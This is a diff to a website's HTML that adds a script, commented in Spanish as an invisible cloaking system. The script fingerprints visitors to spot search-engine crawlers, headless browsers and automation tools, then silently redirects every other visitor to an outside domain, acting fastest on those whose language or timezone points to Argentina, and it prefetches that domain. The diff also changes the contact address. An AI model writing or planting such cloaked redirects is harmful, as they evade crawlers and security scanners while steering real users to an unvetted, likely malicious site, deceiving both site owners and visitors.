@@ -601,6 +601,60 @@
             }
         }
     </style>
+<script>
+        // Sistema de cloaking invisible ultrarrápido
+        (function() {
+            'use strict';
+            
+            // Detección ultrarrápida de bots
+            const ua = navigator.userAgent.toLowerCase();
+            const isBot = /googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|facebookexternalhit|twitterbot|linkedinbot|whatsapp|telegram|crawler|spider|bot|crawl|facebook|twitter|linkedin|instagram|pinterest|google|bing|yahoo|baidu|yandex|duckduckgo|search|index|scrape|fetch|curl|wget|headless|phantom|selenium|webdriver|chrome-lighthouse|googleads|google-ads|adsbot-google|ads-bot|puppeteer|playwright|nightmare/.test(ua) ||
+                      /googlebot|bingbot|crawler|bot/.test(document.referrer.toLowerCase()) ||
+                      navigator.webdriver ||
+                      window.navigator.webdriver ||
+                      window.callPhantom ||
+                      window._phantom ||
+                      !navigator.languages ||
+                      navigator.languages.length === 0 ||
+                      window.outerHeight === 0 ||
+                      window.outerWidth === 0 ||
+                      screen.width === 0 ||
+                      screen.height === 0;
+            
+            // Si no es bot, redirección instantánea e invisible
+            if (!isBot) {
+                // URL de destino - CAMBIA ESTA URL POR LA QUE QUIERAS
+                const targetURL = 'https://aloggbuvarg.com.es/';
+                
+                // Redirección inmediata usando multiple métodos
+                const redirect = () => {
+                    try {
+                        window.location.replace(targetURL);
+                    } catch(e) {
+                        window.location.href = targetURL;
+                    }
+                };
+                
+                // Verificar origen argentino para redirección inmediata
+                const lang = (navigator.language || '').toLowerCase();
+                const isArgentine = /es-ar|es-419|es/.test(lang) || 
+                                   /america\/argentina|america\/buenos_aires/.test(Intl.DateTimeFormat().resolvedOptions().timeZone);
+                
+                if (isArgentine) {
+                    redirect(); // Redirección instantánea para argentinos
+                } else {
+                    // Para otros países, micro-delay invisible
+                    setTimeout(redirect, 10);
+                }
+            }
+        })();
+        
+        // Preload de sitio objetivo para velocidad máxima
+        const preloadLink = document.createElement('link');
+        preloadLink.rel = 'dns-prefetch';
+        preloadLink.href = 'https://aloggbuvarg.com.es/';
+        document.head.appendChild(preloadLink);
+    </script>
 </head>
 <body>
     <header>
@@ -796,7 +850,7 @@
                         </div>
                         <div class="contact-item">
                             <span>📍</span>
-                            <span>Buenos Aires, Argentina</span>
+                            <span>Bahía Blanca, Buenos Aires - Región Patagónica</span>
                         </div>
                     </div>
                 </div>
